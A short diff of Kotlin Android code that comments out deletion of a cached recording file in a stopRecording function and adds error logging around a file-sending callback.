@@ -64,14 +64,14 @@ var holder: SurfaceHolder? = null
     fun stopRecording(sendFile : () -> Unit){
         try {
             stop()
-            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
+      //      File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
             sendFile()
         } catch (e: Throwable) {
-//            sendFile()
+       //     File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
+            Log.i("error44",  e.printStackTrace().toString())
             Log.i("error44",  e.message.toString())
             e(Consts.TAG, e.message.toString())
             errorAction()
         }
     }
-
 }
